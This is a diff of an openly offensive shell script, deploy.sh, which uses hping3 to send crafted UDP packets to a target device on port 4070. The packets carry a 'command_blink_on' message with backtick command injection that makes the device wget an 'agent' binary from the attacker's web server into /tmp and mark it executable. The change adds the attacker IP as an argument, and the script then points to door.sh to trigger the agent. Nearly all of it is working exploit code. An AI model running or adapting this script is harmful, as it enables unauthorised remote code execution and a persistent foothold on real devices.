@@ -26,10 +26,10 @@
 ###########################################################################
 
 CMDEXEC=`which hping3`
-EXPECTED_ARGS=2;
+EXPECTED_ARGS=3;
 if [ $# -ne $EXPECTED_ARGS ]
 then
-	echo "Usage: ./deploy.sh <ip> <mac>"
+	echo "Usage: ./deploy.sh <target ip> <target mac> <attackerip>"
   echo "Example: ./deploy.sh 10.0.0.1 00:11:22:33:44:55"
 	exit 1
 fi
@@ -37,19 +37,19 @@ fi
 echo "[*] Creating Data Files."
 mkdir ./datafiles
 cd ./datafiles
-echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/agent http://'${LHOST}'/a`;' > data1.txt
-echo 'command_blink_on;044;'${TMAC}';1`chmod +x /tmp/agent`;' > data2.txt
+echo 'command_blink_on;044;'$2';1`wget -O /tmp/agent http://'$3'/a`;' > data1.txt
+echo 'command_blink_on;044;'$2';1`chmod +x /tmp/agent`;' > data2.txt
 cp ../tools/agent /var/www/html/a
 echo "[*] Data files created"
 
 echo "[*] Executing"
 echo "[*] Sending Payload 1"
-${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
+${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $1 2> /dev/null
 echo ""
 
 echo "[*] Sending Payload 2"
-${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 ${TARGET} 2> /dev/null
+${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 $1 2> /dev/null
 echo ""
 
 echo "[*] 'agent' Script Deployed."
-echo "[*] Use door.sh to trigger the agent script.
+echo "[*] Use door.sh to trigger the agent script."
